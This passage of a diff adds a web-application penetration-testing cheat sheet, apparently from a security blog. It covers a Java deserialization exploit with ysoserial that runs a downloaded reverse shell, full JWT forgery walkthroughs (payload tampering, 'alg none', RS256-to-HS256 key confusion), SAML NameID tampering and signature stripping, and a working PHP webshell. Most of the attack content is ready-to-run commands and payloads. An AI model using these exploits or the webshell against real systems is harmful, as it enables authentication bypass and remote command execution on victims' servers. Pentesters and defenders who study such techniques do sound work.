+</code></pre>
+<ol start="5">
+<li>Run the exploit:</li>
+</ol>
+<pre><code>python2 deserialize_exploit.py -t &lt;vulnerable system ip&gt; -p &lt;vulnerable system port&gt; --jip &lt;attacker system&gt; --jport 4040 --ysopath ysoserial.jar --cmd ""
+</code></pre>
+<ol start="6">
+<li>Run the JRMPListener again to run the reverse shell that we downloaded in the previous step:</li>
+</ol>
+<pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4040 CommonsCollections5 'sh /tmp/shell.sh'
+</code></pre>
+<ol start="7">
+<li>Profit</li>
+</ol>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="useautorizetofindauthorizationissues">Use autorize to find authorization issues</h1>
+<ol>
+<li>Login to the target application as a low privileged user, go to authorize tab in burp - autorize should be off</li>
+<li>Click Configuration</li>
+<li>Click Fetch cookies from last request</li>
+<li>Open incognito window</li>
+<li>Login as high privileged user</li>
+<li>Click <strong>Autorize is off</strong> to turn it on</li>
+<li>Go to areas of site that are admin only</li>
+<li>Look for orange/green in the columns</li>
+</ol>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="testinsecurejwtimplementation">Test insecure JWT implementation</h1>
+<h2 id="changetheuserinthepayload">Change the user in the payload</h2>
+<ol>
+<li>Capture the bearer token</li>
+<li>Base64 decode the second section of the token (the Payload)</li>
+<li>Change the user to another valid user within the context of the application</li>
+<li>Base64 encode the new Payload</li>
+<li>Replace the existing second section with the new Payload</li>
+<li>Send the token and see if the application takes it</li>
+</ol>
+<h2 id="changealgorithmtonone">Change algorithm to none</h2>
+<ol>
+<li>Capture a request with the bearer token, for example:</li>
+</ol>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU1NDkzNjEwNSwiZXhwIjoxNTU0OTM2MjI1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.CUJeDfpJCBD-RKCkGe6q5U2byv0rkxZnRhvPwyFYglg
+</code></pre>
+<ol start="2">
+<li>Base64 decode the first section of the token (everything before the first <code>.</code>) with Burp Decoder:</li>
+</ol>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 =&gt;
+{"typ":"JWT","alg":"HS256"}
+</code></pre>
+<ol start="3">
+<li>Change <code>"alg":"HS256"</code> to <code>"alg":"none"</code> and Base64 encode it:</li>
+</ol>
+<pre><code>{"typ":"JWT","alg":"none"} =&gt;
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
+</code></pre>
+<ol start="4">
+<li>Replace the first section of the token with it and remove the last part of the token (the signature), but leave the period at the end:</li>
+</ol>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU1NDkzNjEwNSwiZXhwIjoxNTU0OTM2MjI1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.
+</code></pre>
+<p><a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php?">Awesome demo site for testing purposes</a></p>
+<h2 id="changealgorithmfromrs256tohs256">Change algorithm from RS256 to HS256</h2>
+<ol>
+<li>Get the public cert from the target server:</li>
+</ol>
+<pre><code>openssl s_client -connect www.google.com:443 2&gt;/dev/null &lt;/dev/null |  sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' &gt; cert.pem
+</code></pre>
+<ol start="2">
+<li>Turn it into the public key:</li>
+</ol>
+<pre><code>openssl x509 -in cert.pem -pubkey -noout &gt; public.pem
+</code></pre>
+<p>One-liner alternative:</p>
+<pre><code>openssl s_client -connect www.google.com:443 | openssl x509 -pubkey -noout &gt; public.pem
+</code></pre>
+<ol start="3">
+<li>Turn it into ASCII hex:</li>
+</ol>
+<pre><code>cat public.pem | xxd -p | tr -d "\\n" &gt; hex.txt
+</code></pre>
+<ol start="4">
+<li>Get a JWT token, for example:</li>
+</ol>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU1NDk0MTE5NywiZXhwIjoxNTU0OTQxMzE3LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.OQq0VqiYsSxTzTSFEnwVVW0eRbrkeEW5VnsGYDLQ5BXMAKfTGbXxL00s07JvLDhWJsSuKyOwkWOh1evUSBikZ97zQgqqYvECv26FyhxGKnzXIWK5Efg8H0lsmy7HJ-YQJDbhRkZLJ6G5DPW5bCxjzRFcvzqtMmiAM0B3zMiSXOMSMJ_NtmVe1WtM7lQD38a2uDfOtuFSn5e0D2RgFJa2lOP2d1oFGchJqDM9IbkAZSzAlHx0tftR2DqV-N3VlD0UiAWygVfWQukOiGPa5ms0pz886B4hFP1xmBeNK49y1SLhQ7yw2VozFhte6mvQFbPTXHqFxCqB8MG0fn0LkqtHXg
+</code></pre>
+<ol start="5">
+<li>Take the first section and change it from RS256 to HS256:</li>
+</ol>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9 =&gt;
+{"typ":"JWT","alg":"RS256"} =&gt;
+{"typ":"JWT","alg":"HS256"} =&gt;
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
+</code></pre>
+<ol start="6">
+<li>Use the hex in hex.txt for the signing operation with the first two parts of the token (without the period at the end):</li>
+</ol>
+<pre><code>echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU1NDk0MTE5NywiZXhwIjoxNTU0OTQxMzE3LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
+</code></pre>
+<p>This outputs the HMAC signature:</p>
+<pre><code>076be5cb34056468b78a2c27194516912f5346201e9dd674ae97b1fb04058a4e
+</code></pre>
+<ol start="7">
+<li>Take the output and turn it into JWT format with python:</li>
+</ol>
+<pre><code>python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('076be5cb34056468b78a2c27194516912f5346201e9dd674ae97b1fb04058a4e')).replace('=','')\")"
+</code></pre>
+<p>This will output something like this:</p>
+<pre><code>B2vlyzQFZGi3iiwnGUUWkS9TRiAendZ0rpex-wQFik4
+</code></pre>
+<ol start="8">
+<li>Take the output and put it in for the signature (the last section of the token):</li>
+</ol>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU1NDk0MTE5NywiZXhwIjoxNTU0OTQxMzE3LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.B2vlyzQFZGi3iiwnGUUWkS9TRiAendZ0rpex-wQFik4
+</code></pre>
+<p><a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php">Awesome demo site for testing purposes</a></p>
+<p><strong>Resources:</strong><br>
+<a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/</a><br>
+<a href="https://stackoverflow.com/questions/7885785/using-openssl-to-get-the-certificate-from-a-server">https://stackoverflow.com/questions/7885785/using-openssl-to-get-the-certificate-from-a-server</a></p>
+<p>Note that when you're modifying the base64 string, you need to add padding (<code>=</code>) in order to get the correct string representation. It is worth noting that this is not required by <a href="https://www.rfc-editor.org/rfc/rfc7515.txt">RFC 7515</a>.</p>
+<p>This is a cheatsheet that covers the various things that should be tested when looking at a site that uses JWT: <a href="https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf">https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf</a></p>
+<p><strong>Useful resources:</strong><br>
+Great site with a demo page: <a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a><br>
+Debug jwt tokens: <a href="https://jwt.io/">https://jwt.io/</a><br>
+<a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.md">https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.md</a></p>
+<p><strong>Useful writeups:</strong><br>
+<a href="https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html">https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html</a><br>
+<a href="https://medium.com/@0xSyndr0me/h1702-2018-web-challenge-write-up-4aea52d31807">https://medium.com/@0xSyndr0me/h1702-2018-web-challenge-write-up-4aea52d31807</a><br>
+<a href="https://gist.github.com/amalmurali47/8cf251f75db282376c8f58c27d7d900a">https://gist.github.com/amalmurali47/8cf251f75db282376c8f58c27d7d900a</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="lfi">LFI</h1>
+<h2 id="bugbountywriteups">Bug bounty write-ups:</h2>
+<p><a href="https://hack-ed.net/2017/11/05/finally-a-bug-bounty-write-up-lfi/">https://hack-ed.net/2017/11/05/finally-a-bug-bounty-write-up-lfi/</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="subdomaintakeover">Subdomain Takeover</h1>
+<p><a href="https://0xpatrik.com/subdomain-takeover-starbucks/">https://0xpatrik.com/subdomain-takeover-starbucks/</a><br>
+<a href="https://medium.com/@hakluke/how-to-setup-an-automated-sub-domain-takeover-scanner-for-all-bug-bounty-programs-in-5-minutes-3562eb621db3">https://medium.com/@hakluke/how-to-setup-an-automated-sub-domain-takeover-scanner-for-all-bug-bounty-programs-in-5-minutes-3562eb621db3</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="existingcheatsheetsandresources">Existing Cheatsheets and Resources</h1>
+<p>This details all of the steps from recon to exploitation. Definitely worth checking out:<br>
+<a href="https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/">https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/</a><br>
+Another great one:<br>
+<a href="https://danielmiessler.com/projects/webappsec_testing_resources/">https://danielmiessler.com/projects/webappsec_testing_resources/</a><br>
+Some awesome bug hunting findings:<br>
+<a href="https://www.youtube.com/watch?v=mQjTgDuLsp4">https://www.youtube.com/watch?v=mQjTgDuLsp4</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="goodresourcesfordevelopers">Good resources for developers</h1>
+<p>These are some sites that you can send to developers that are trying to understand web application security fundamentals.</p>
+<p><a href="https://medium.freecodecamp.org/a-quick-introduction-to-web-security-f90beaf4dd41">https://medium.freecodecamp.org/a-quick-introduction-to-web-security-f90beaf4dd41</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="samlattacks">SAML Attacks</h1>
+<h2 id="changingtheuser">Changing the user</h2>
+<ol>
+<li>Intercept a request with the SAMLResponse</li>
+<li>Locate the <code>&lt;NameID[stuff]&lt;/NameID&gt;</code> tag</li>
+<li>Modify the <code>&lt;NameID[stuff]&lt;/NameID&gt;</code> tag to another user with the help of the <a href="https://github.com/SAMLRaider/SAMLRaider">SAML Raider Burp Extension</a>. For example, <code>user@site.com</code> to <code>admin@site.com</code></li>
+<li>Forward it on</li>
+</ol>
+<h2 id="strippingthesignatureandchangingtheuser">Stripping the signature and changing the user</h2>
+<ol>
+<li>Intercept a request with the SAMLResponse</li>
+<li>Locate the <code>&lt;NameID[stuff]&lt;/NameID&gt;</code> tag</li>
+<li>Modify the <code>&lt;NameID[stuff]&lt;/NameID&gt;</code> tag to another user with the help of the <a href="https://github.com/SAMLRaider/SAMLRaider">SAML Raider Burp Extension</a>. For example, <code>user@site.com</code> to <code>admin@site.com</code></li>
+<li>Locate the <a href="ds:SignatureValue">ds:SignatureValue</a>[stuff]&lt;/ds:SignatureValue&gt;</li>
+<li>Remove the contents in-between these two strings</li>
+<li>Forward it on</li>
+</ol>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="basicphpwebshell">Basic PHP Webshell</h1>
+<p><code>webshell.php:</code></p>
+<pre><code>&lt;?php if(isset($_REQUEST['cmd'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;
+</code></pre>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="sastscripts">SAST Scripts</h1>
+<p>Find deserialization vulns in java-based repo:</p>
+<pre><code>find . -name "*.java" -print -exec grep -E "XMLdecoder|XStream|ObjectInputStream|Serializable" {} \; | tee prodsec/serializable.txt
+</code></pre>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="sessionvslocalstorage">Session vs Local Storage</h1>
+<p>With session storage, the token does not persist after the browser has been closed. For local storage, the token persists after the browser is closed until it expires.</p>
+<!--kg-card-end: markdown-->
+			</section>
+
